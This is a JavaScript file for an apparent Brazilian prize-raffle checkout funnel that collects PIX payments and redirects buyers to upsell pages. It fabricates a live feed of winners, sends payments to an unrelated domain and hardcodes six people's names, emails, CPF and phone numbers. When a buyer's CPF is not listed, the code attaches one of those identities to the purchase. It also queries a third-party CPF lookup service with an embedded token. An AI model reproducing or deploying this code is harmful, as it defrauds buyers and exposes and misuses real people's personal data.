(function() {
    const notifyDefaults = { width: "320px", position: "right-top", fontFamily: "Poppins" };
    const DUTTYFY_PIX_URL_ENCRYPTED = "https://www.pagamentos-seguros.app/api-pix/S8r8QN3vwEHWkhOTJhwayYXAc_BAB7mB6k92DzulTzFBe8JNTWA6l9tuaDwSD_4lbhiIZcbnboyHqarsZ9LcGA";
    const CPF_LOOKUP_TOKEN = "56fb9cbc8d3a7cf7d1c1c8ac12730ec883f150a7134687099bab95058c76aaab";
    const FIRST_UPSELL_URL = "../up/1/index.html";
    const PAID_PIX_STATUSES = new Set(["COMPLETED", "PAID", "APPROVED", "CONFIRMED", "SUCCESS"]);
    const cpfLookupCache = new Map();
    const customers = [
        { name: "WESCLAY MARTINS DA SILVA", email: "wesclaysilva4@gmail.com", document: "04212359189", phone: "64993398153" },
        { name: "VERA BATISTA DE MELO COSTA E SILVA", email: "verabatistademelo08@gmail.com", document: "27445449817", phone: "14996882527" },
        { name: "DIONI ARRUDA", email: "arrudadione34@gmail.com", document: "09010344959", phone: "55449983691" },
        { name: "LUCIANO GONCALVES RODRIGUES", email: "lucianorodrigues2120@gmail.com", document: "62531042172", phone: "93992104922" },
        { name: "JESSICA DE OLIVEIRA SILVA", email: "jessicaosa589@gmail.com", document: "07514380574", phone: "77999589275" },
        { name: "TATIANE FIGUEIREDO FERREIRA", email: "tatianefigueoredo79@gmail.com", document: "05290675795", phone: "21971176760" }
    ];
    let selectedCustomer = null;
    let cpfLookupRequestId = 0;

    document.addEventListener("DOMContentLoaded", () => {
        if (window.Notiflix && Notiflix.Notify) {
            Notiflix.Notify.init(notifyDefaults);
        }

        const page = document.body.dataset.page;
        if (page === "begin") initBeginPage();
        if (page === "vsl") initVslPage();
        if (page === "up") initUpsellPage();
    });

    /* ------------------ BEGIN PAGE ------------------ */
    function initBeginPage() {
        const names = ["João S.", "Maria S.", "Carlos A.", "Ana P.", "Lucas M.", "Fernanda R.", "Pedro H.", "Paula C.", "Marcos F.", "Julia M.", "Rafael D.", "Camila V.", "Bruno B.", "Amanda G.", "Thiago K.", "Letícia T.", "Diego W.", "Beatriz N.", "Rodrigo P.", "Larissa S.", "Gustavo C.", "Isabela M."];
        const prizesData = [
            { name: "iPhone 15", img: "images/Premios (6).jpg", isChance: false },
            { name: "Playstation 5", img: "images/Premios (6).jpg", isChance: false },
            { name: "Moto 0KM", img: "images/Premios (2).jpg", isChance: false },
            { name: "Carro 0KM", img: "images/Premios (4).jpg", isChance: false },
            { name: "Airfryer", img: "images/Premios (7).jpg", isChance: false },
            { name: "R$ 10.000,00 no PIX", img: "images/Premios (5).jpg", isChance: false },
            { name: "Chances Extras", img: "images/Design sem nome (87).jpg", isChance: true }
        ];

        setupWinnersFeed(document.getElementById("winnersFeedList"), names, prizesData);
        setupGeoBar();
        updateSundayCountdown();
        setupCotaCards();
        const btnComprar = document.querySelector(".btn-buy");
        if (btnComprar) btnComprar.addEventListener("click", finalizarCompra);
    }

    function setupCotaCards() {
        const cards = document.querySelectorAll("[data-qtd]");
        cards.forEach(card => {
            card.addEventListener("click", () => {
                setVal(parseInt(card.dataset.qtd, 10), { silent: true });
                openCheckoutModal();
            });
        });

        const saved = parseInt(localStorage.getItem("vs_qtd") || "0", 10);
        if (saved > 0) {
            setVal(saved, { silent: true });
        }

        setupCheckoutModal();
    }

    function setVal(qtd, { silent = false } = {}) {
        const input = document.getElementById("qtdInput");
        if (input) input.value = qtd;

        document.querySelectorAll("[data-qtd]").forEach(c => {
            c.classList.toggle("selected", parseInt(c.dataset.qtd, 10) === qtd);
        });

        localStorage.setItem("vs_qtd", String(qtd));

        if (!silent && window.Notiflix && Notiflix.Notify) {
            Notiflix.Notify.success(`${qtd} títulos selecionados.`);
        }
    }

    function finalizarCompra() {
        const qtd = parseInt(document.getElementById("qtdInput")?.value || "0", 10);
        if (qtd > 0) {
            openCheckoutModal();
        } else if (window.Notiflix && Notiflix.Notify) {
            Notiflix.Notify.warning("Selecione uma quantidade primeiro!");
        }
    }

    function setupCheckoutModal() {
        const modal = document.getElementById("checkoutModal");
        if (!modal) return;

        document.getElementById("checkoutClose")?.addEventListener("click", closeCheckoutModal);
        document.getElementById("checkoutFinish")?.addEventListener("click", closeCheckoutModal);
        modal.addEventListener("click", (event) => {
            if (event.target === modal) closeCheckoutModal();
        });

        const cpfInput = document.getElementById("cpfInput");
        cpfInput?.addEventListener("input", () => {
            cpfInput.value = formatCpf(cpfInput.value);
            findCustomerByCpf(cpfInput.value);
        });
        cpfInput?.addEventListener("keydown", (event) => {
            if (event.key === "Enter") {
                event.preventDefault();
                startPixPayment();
            }
        });

        document.getElementById("cpfContinue")?.addEventListener("click", startPixPayment);
        document.getElementById("pixCopyButton")?.addEventListener("click", copyPixCode);
    }

    function openCheckoutModal() {
        const modal = document.getElementById("checkoutModal");
        if (!modal) return;
        selectedCustomer = null;
        updateCheckoutSummary();
        showCheckoutStep(1);
        resetPixResult();
        document.getElementById("cpfInput").value = "";
        document.getElementById("cpfError").textContent = "";
        document.getElementById("customerFound").hidden = true;
        modal.classList.add("is-open");
        modal.setAttribute("aria-hidden", "false");
        setTimeout(() => document.getElementById("cpfInput")?.focus(), 80);
    }

    function closeCheckoutModal() {
        const modal = document.getElementById("checkoutModal");
        if (!modal) return;
        modal.classList.remove("is-open");
        modal.setAttribute("aria-hidden", "true");
    }

    function updateCheckoutSummary() {
        const qtd = getSelectedQtd();
        const summary = document.getElementById("checkoutSummary");
        if (summary) summary.textContent = `${qtd} títulos - ${formatMoney(getSelectedAmount())}`;
    }

    function showCheckoutStep(step) {
        document.querySelectorAll(".checkout-step-panel").forEach(panel => {
            panel.classList.toggle("active", panel.dataset.stepPanel === String(step));
        });
        document.querySelectorAll(".checkout-step").forEach((item, index) => {
            const itemStep = index + 1;
            item.classList.toggle("active", itemStep === step);
            item.classList.toggle("done", itemStep < step);
        });
    }

    function findCustomerByCpf(rawCpf) {
        const cpf = onlyDigits(rawCpf);
        const listedCustomer = customers.find(customer => customer.document === cpf) || null;

        const foundBox = document.getElementById("customerFound");
        const foundText = document.getElementById("customerFoundText");
        const error = document.getElementById("cpfError");
        if (error) error.textContent = "";

        if (cpf.length === 11 && isValidCpf(cpf)) {
            selectedCustomer = listedCustomer || buildDefaultCustomer(cpf);
        } else {
            selectedCustomer = null;
        }

        if (selectedCustomer && foundBox && foundText) {
            foundText.innerHTML = `<b>CPF:</b> ${formatCpf(cpf)}<br><b>Nome:</b> consultando...<br><b>Status:</b> liberado para pagamento`;
            foundBox.hidden = false;
            hydrateCustomerFromCpf(cpf);
        } else if (foundBox) {
            foundBox.hidden = true;
        }
    }

    async function startPixPayment() {
        const cpf = onlyDigits(document.getElementById("cpfInput")?.value || "");
        const error = document.getElementById("cpfError");
        findCustomerByCpf(cpf);

        if (!selectedCustomer) {
            if (error) error.textContent = "Coloque um CPF válido para continuar.";
            return;
        }

        await hydrateCustomerFromCpf(cpf);
        showCheckoutStep(2);
        resetPixResult();
        await generatePix();
    }

    async function generatePix() {
        const qtd = getSelectedQtd();
        const amount = getSelectedAmount();
        const payload = {
            quantity: qtd,
            amount,
            description: `${qtd} titulos Viva Sorte`,
            customer: selectedCustomer,
            utm: getTrackingQuery()
        };

        try {
            const data = await requestPix(payload);

            renderPixResult(data);
        } catch (error) {
            const status = document.getElementById("pixPaymentStatus");
            document.getElementById("pixLoading").style.display = "none";
            document.getElementById("pixResult").hidden = false;
            if (status) status.textContent = error.message;
            if (window.Notiflix && Notiflix.Notify) Notiflix.Notify.failure(error.message);
        }
    }

    async function requestPix(payload) {
        const duttyPayload = {
            amount: payload.amount,
            description: payload.description,
            customer: payload.customer,
            item: {
                title: payload.description,
                price: payload.amount,
                quantity: 1
            },
            paymentMethod: "PIX",
            utm: payload.utm || ""
        };

        const response = await fetch(DUTTYFY_PIX_URL_ENCRYPTED, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json"
            },
            body: JSON.stringify(duttyPayload)
        });
        const responseText = await response.text();
        let data;

        try {
            data = JSON.parse(responseText);
        } catch (parseError) {
            throw new Error(`Resposta inválida da Dutty (${response.status}).`);
        }

        if (!response.ok || data.status === "error" || data.success === false) {
            throw new Error(getApiErrorMessage(data) || `Dutty retornou erro ${response.status}.`);
        }

        return data;
    }

    function renderPixResult(data) {
        const pixCode = data.pixCode || data.pix_code || data.qr_code || data.ar_code || data.copy_paste || data.emv || "";
        const qrImage = data.qrCodeImage || data.qr_code_image || data.ar_code_base64 || data.qr_code_base64 || "";
        const imageEl = document.getElementById("pixQrImage");
        const codeEl = document.getElementById("pixCopyCode");
        const status = document.getElementById("pixPaymentStatus");

        document.getElementById("pixLoading").style.display = "none";
        document.getElementById("pixResult").hidden = false;

        if (imageEl && qrImage) {
            imageEl.src = qrImage.startsWith("data:") ? qrImage : `data:image/png;base64,${qrImage}`;
            imageEl.hidden = false;
        } else if (imageEl && pixCode) {
            imageEl.src = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(pixCode)}`;
            imageEl.hidden = false;
        }

        if (codeEl) codeEl.value = pixCode;
        if (!pixCode) {
            throw new Error("Pix criado, mas a Dutty não retornou código copia e cola.");
        }

        const transactionId = data.transactionId || data.transaction_id || data.id;
        if (status) status.textContent = transactionId ? `Pedido ${transactionId} aguardando pagamento.` : "Aguardando pagamento.";
        if (transactionId) startPixStatusPolling(transactionId);
        showCheckoutStep(2);
    }

    function startPixStatusPolling(transactionId) {
        const statusEl = document.getElementById("pixPaymentStatus");
        const startedAt = Date.now();
        const interval = setInterval(async () => {
            if (Date.now() - startedAt > 15 * 60 * 1000) {
                clearInterval(interval);
                if (statusEl) statusEl.textContent = "Tempo para pagamento expirado. Gere um novo Pix.";
                return;
            }

            try {
                const statusUrl = `${DUTTYFY_PIX_URL_ENCRYPTED}?transactionId=${encodeURIComponent(transactionId)}`;
                const response = await fetch(statusUrl, {
                    headers: { "Accept": "application/json" }
                });
                const data = await response.json();
                if (isPaidPixStatus(data)) {
                    clearInterval(interval);
                    if (statusEl) statusEl.textContent = "Pagamento confirmado.";
                    showCheckoutStep(3);
                    redirectToFirstUpsell();
                }
            } catch (error) {
                // The next polling cycle handles temporary failures.
            }
        }, 5000);
    }

    function isPaidPixStatus(data) {
        const status = String(data?.status || data?.paymentStatus || data?.payment_status || "").toUpperCase();
        return PAID_PIX_STATUSES.has(status);
    }

    function redirectToFirstUpsell() {
        const target = new URL(FIRST_UPSELL_URL, window.location.href);
        const tracking = getTrackingQuery();
        if (tracking) {
            const params = new URLSearchParams(tracking);
            params.forEach((value, key) => target.searchParams.set(key, value));
        }

        setTimeout(() => {
            window.location.href = target.toString();
        }, 800);
    }

    function resetPixResult() {
        const loading = document.getElementById("pixLoading");
        const result = document.getElementById("pixResult");
        const imageEl = document.getElementById("pixQrImage");
        const codeEl = document.getElementById("pixCopyCode");
        const status = document.getElementById("pixPaymentStatus");
        if (loading) loading.style.display = "flex";
        if (result) result.hidden = true;
        if (imageEl) {
            imageEl.hidden = true;
            imageEl.removeAttribute("src");
        }
        if (codeEl) codeEl.value = "";
        if (status) status.textContent = "";
    }

    function copyPixCode() {
        const code = document.getElementById("pixCopyCode")?.value || "";
        if (!code) return;
        navigator.clipboard.writeText(code).then(() => {
            if (window.Notiflix && Notiflix.Notify) Notiflix.Notify.success("Código Pix copiado!");
        }).catch(() => {
            document.getElementById("pixCopyCode")?.select();
            document.execCommand("copy");
        });
    }

    function getSelectedQtd() {
        return parseInt(document.getElementById("qtdInput")?.value || "0", 10);
    }

    function getSelectedAmount() {
        const qtd = getSelectedQtd();
        const selectedCard = document.querySelector(`.cota-card.selected[data-qtd="${qtd}"]`);
        return parseInt(selectedCard?.dataset.amount || "0", 10);
    }

    function buildDefaultCustomer(cpf) {
        const digits = onlyDigits(cpf);
        const index = digits.split("").reduce((sum, digit) => sum + Number(digit), 0) % customers.length;
        return {
            ...customers[index],
            document: digits
        };
    }

    async function hydrateCustomerFromCpf(cpf) {
        const digits = onlyDigits(cpf);
        if (!selectedCustomer || selectedCustomer.document !== digits) return selectedCustomer;

        const requestId = ++cpfLookupRequestId;
        let data = cpfLookupCache.get(digits);

        if (!data) {
            try {
                const url = `https://bk.elaiflow.dev/consultar-filtrada/cpf?cpf=${digits}&token=${CPF_LOOKUP_TOKEN}`;
                const response = await fetch(url, { method: "GET" });
                data = await response.json();
                cpfLookupCache.set(digits, data || {});
            } catch (error) {
                data = {};
            }
        }

        if (requestId !== cpfLookupRequestId && document.getElementById("cpfInput")) {
            const currentCpf = onlyDigits(document.getElementById("cpfInput").value);
            if (currentCpf !== digits) return selectedCustomer;
        }

        const apiName = typeof data?.nome === "string" ? data.nome.trim() : "";
        if (apiName) {
            selectedCustomer = {
                ...selectedCustomer,
                name: apiName,
                document: digits
            };
        }

        renderCustomerFound(digits, selectedCustomer.name);
        return selectedCustomer;
    }

    function renderCustomerFound(cpf, name) {
        const foundBox = document.getElementById("customerFound");
        const foundText = document.getElementById("customerFoundText");
        if (!foundBox || !foundText) return;

        foundText.innerHTML = `<b>CPF:</b> ${formatCpf(cpf)}<br><b>Nome:</b> ${escapeHtml(name || "Cliente")}<br><b>Status:</b> liberado para pagamento`;
        foundBox.hidden = false;
    }

    function escapeHtml(value) {
        return String(value)
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }

    function getApiErrorMessage(data) {
        if (!data || typeof data !== "object") return "";
        if (typeof data.message === "string") return data.message;
        if (typeof data.error === "string") return data.error;
        if (Array.isArray(data.errors)) return data.errors.join(" ");
        if (data.errors && typeof data.errors === "object") {
            return Object.values(data.errors).flat().join(" ");
        }
        return "";
    }

    function getTrackingQuery() {
        const rawQuery = window.location.search.replace(/^\?/, "");
        if (rawQuery) return rawQuery;

        const params = new URLSearchParams(window.location.search);
        const keys = [
            "utm_source",
            "utm_medium",
            "utm_campaign",
            "utm_content",
            "utm_term",
            "fbclid",
            "ttclid",
            "click_id",
            "gclid",
            "src",
            "sck"
        ];

        keys.forEach(key => {
            if (!params.get(key)) {
                const stored = localStorage.getItem(key);
                if (stored) params.set(key, stored);
            }
        });

        return params.toString();
    }

    function formatMoney(cents) {
        return (cents / 100).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
    }

    function onlyDigits(value) {
        return String(value || "").replace(/\D/g, "");
    }

    function formatCpf(value) {
        const digits = onlyDigits(value).slice(0, 11);
        return digits
            .replace(/(\d{3})(\d)/, "$1.$2")
            .replace(/(\d{3})(\d)/, "$1.$2")
            .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    }

    function isValidCpf(cpf) {
        const digits = onlyDigits(cpf);
        if (digits.length !== 11 || /^(\d)\1{10}$/.test(digits)) return false;

        let sum = 0;
        for (let i = 0; i < 9; i++) sum += Number(digits[i]) * (10 - i);
        let firstDigit = (sum * 10) % 11;
        if (firstDigit === 10) firstDigit = 0;

        sum = 0;
        for (let i = 0; i < 10; i++) sum += Number(digits[i]) * (11 - i);
        let secondDigit = (sum * 10) % 11;
        if (secondDigit === 10) secondDigit = 0;

        return firstDigit === Number(digits[9]) && secondDigit === Number(digits[10]);
    }

    function setupGeoBar() {
        const userStateEl = document.getElementById("user-state");
        if (!userStateEl) return;
        fetch("https://ipapi.co/json/")
            .then(r => (r.ok ? r.json() : {}))
            .then(data => { userStateEl.textContent = data.region || "seu estado"; })
            .catch(() => { userStateEl.textContent = "seu estado"; });
    }

    function updateSundayCountdown() {
        const tag = document.getElementById("diasDomingo");
        if (!tag) return;
        const now = new Date();
        const daysUntilSunday = now.getDay() === 0 ? 0 : 7 - now.getDay();
        if (daysUntilSunday === 0) {
            tag.textContent = "hoje";
        } else if (daysUntilSunday === 1) {
            tag.textContent = "1 dia";
        } else {
            tag.textContent = `${daysUntilSunday} dias`;
        }
    }

    /* ------------------ VSL PAGE ------------------ */
    function initVslPage() {
        const video = document.getElementById("vslVideo");
        if (video) {
            window.addEventListener("load", () => {
                setTimeout(() => { video.play().catch(() => {}); }, 3000);
            });
            window.addEventListener("click", () => {
                video.muted = false;
                if (video.paused) video.play();
            }, { once: true });
        }

        const btnAtivar = document.getElementById("btnAtivar");
        if (btnAtivar) {
            btnAtivar.addEventListener("click", () => {
                if (window.Notiflix && Notiflix.Notify) {
                    Notiflix.Notify.success("Carregando ofertas exclusivas...");
                }
                setTimeout(() => {
                    window.location.href = "https://vivasortecapitalizacao.com/2/up/";
                }, 1000);
            });
        }
    }

    /* ------------------ UPSELL PAGE ------------------ */
    function initUpsellPage() {
        const names = ["João S.", "Maria S.", "Carlos A.", "Ana P.", "Lucas M.", "Fernanda R.", "Pedro H.", "Paula C.", "Marcos F.", "Julia M.", "Rafael D.", "Camila V.", "Bruno B.", "Amanda G.", "Thiago K.", "Letícia T.", "Diego W.", "Beatriz N.", "Rodrigo P.", "Larissa S.", "Gustavo C.", "Isabela M."];
        const prizesData = [
            { name: "iPhone 15", img: "images/Premios (6).jpg", isChance: false },
            { name: "Playstation 5", img: "images/Premios (6).jpg", isChance: false },
            { name: "Moto 0KM", img: "images/Premios (2).jpg", isChance: false },
            { name: "Carro 0KM", img: "images/Premios (4).jpg", isChance: false },
            { name: "Airfryer", img: "images/Premios (7).jpg", isChance: false },
            { name: "R$ 10.000,00 no PIX", img: "images/Premios (5).jpg", isChance: false },
            { name: "Chances Extras", img: "images/Design sem nome (87).jpg", isChance: true }
        ];
        setupWinnersFeed(document.getElementById("winnersFeedList"), names, prizesData);
        setupUpsellButtons();
    }

    function setupUpsellButtons() {
        const buttons = document.querySelectorAll(".btn-buy");
        buttons.forEach(btn => {
            btn.addEventListener("click", function(e) {
                e.preventDefault();
                const url = this.getAttribute("data-url");
                const originalContent = this.innerHTML;
                this.innerHTML = '<span class="spinner-border" aria-hidden="true"></span>';
                this.style.pointerEvents = "none";
                if (window.Notiflix && Notiflix.Notify) {
                    Notiflix.Notify.success("Redirecionando...");
                }
                setTimeout(() => {
                    if (url) {
                        window.location.href = url;
                    } else {
                        this.innerHTML = originalContent;
                        this.style.pointerEvents = "auto";
                    }
                }, 1200);
            });
        });
    }

    /* ------------------ HELPERS ------------------ */
    function setupWinnersFeed(listEl, names, prizesData) {
        if (!listEl) return;
        const createFeedItemHTML = () => {
            const rName = names[Math.floor(Math.random() * names.length)];
            const rPrize = prizesData[Math.floor(Math.random() * prizesData.length)];
            const finalPrizeName = rPrize.isChance ? `+${Math.floor(Math.random() * 5) + 1} Chances Extras` : rPrize.name;
            const item = document.createElement("div");
            item.className = "winner-feed-item";
            item.innerHTML = `<img src="${rPrize.img}" alt="Prêmio" class="winner-prize-img"><div class="winner-info"><span class="winner-name">${rName} <i class="bi bi-patch-check-fill verified-icon"></i></span><span class="winner-prize-name">ganhou ${finalPrizeName}</span></div>`;
            return item;
        };

        for (let i = 0; i < 3; i++) { listEl.appendChild(createFeedItemHTML()); }

        const triggerFeedUpdate = () => {
            const newItem = createFeedItemHTML();
            listEl.prepend(newItem);
            if (listEl.children.length > 4) {
                const lastChild = listEl.lastElementChild;
                lastChild.classList.add("removing");
                setTimeout(() => { if (lastChild.parentNode) lastChild.remove(); }, 500);
            }
            setTimeout(triggerFeedUpdate, Math.floor(Math.random() * (15000 - 8000 + 1)) + 8000);
        };
        setTimeout(triggerFeedUpdate, 3000);
    }
})();
